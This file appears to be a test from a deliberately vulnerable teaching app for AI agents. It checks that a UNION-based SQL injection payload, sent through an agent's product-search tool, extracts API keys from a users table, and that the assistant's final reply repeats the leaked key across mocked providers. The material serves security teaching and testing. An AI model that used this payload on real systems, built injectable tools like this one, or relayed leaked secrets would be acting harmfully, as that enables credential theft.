/**
 * @intentional-vulnerability sqli-union
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/product-search/tools/search.js
 *
 * Parity: sqli-union outcome must be identical across Mock, Anthropic-mock,
 * and OpenAI-mock providers. If provider mechanics ever change the outcome,
 * that's a design bug — the vuln lives in the tool implementation.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { runParity } = require('./_harness.js');

const REPO = path.resolve(__dirname, '../../../..');

test('parity/sqli-union: identical exploit outcome across mock, anthropic, openai providers', async () => {
  const injection = `zzz%' UNION SELECT NULL,api_key,NULL,NULL,NULL,NULL,NULL,NULL,'active',NULL,NULL FROM shop_users --`;

  await runParity({
    role: 'customer',
    userId: 2,
    userMessage: `search products for ${injection}`,
    // We hardcode the final assistant text with the payload since the
    // SQLi outcome is deterministic — every provider script produces the
    // same message. That's exactly the parity property we're testing.
    script: [
      { stop: 'tool_use', tool_uses: [{ name: 'product-search.search', args: { query: injection } }] },
      { stop: 'end_turn', text: 'Found: sk_ss_sasan_secret_key_deadbeef' },
    ],
    manifestTools: [{
      agent: 'product-search', tool: 'search',
      description: 'Full-text-ish product search.',
      inputSchema: { type: 'object', properties: { query: { type: 'string' } } },
    }],
    wireTools(pool, ctx) {
      const { search } = require(path.join(ctx.REPO, 'agent-host/agents/product-search/tools/search.js'));
      pool.callTool = async (agent, tool, args) => {
        if (agent === 'product-search' && tool === 'search') {
          const r = await search(args || {});
          return { content: [{ type: 'text', text: JSON.stringify(r) }] };
        }
        return { content: [{ type: 'text', text: '{}' }] };
      };
    },
    assertOutcome(runResult) {
      assert.equal(runResult.stopReason, 'end_turn', 'all providers reach end_turn');
      const hop = runResult.hops.find(h => h.tool === 'product-search.search');
      assert.ok(hop, 'search hop present');
      const dump = JSON.stringify(hop.result);
      assert.match(dump, /sk_ss_sasan_secret_key_deadbeef/,
        'leaked api_key surfaces in tool result (SQLi took effect)');
      // Final assistant text must carry the leaked key too — this is the
      // uniform, provider-agnostic exploit outcome.
      assert.match(runResult.text, /sk_ss_sasan_secret_key_deadbeef/,
        'final assistant text carries the leaked api_key');
    },
  });
});
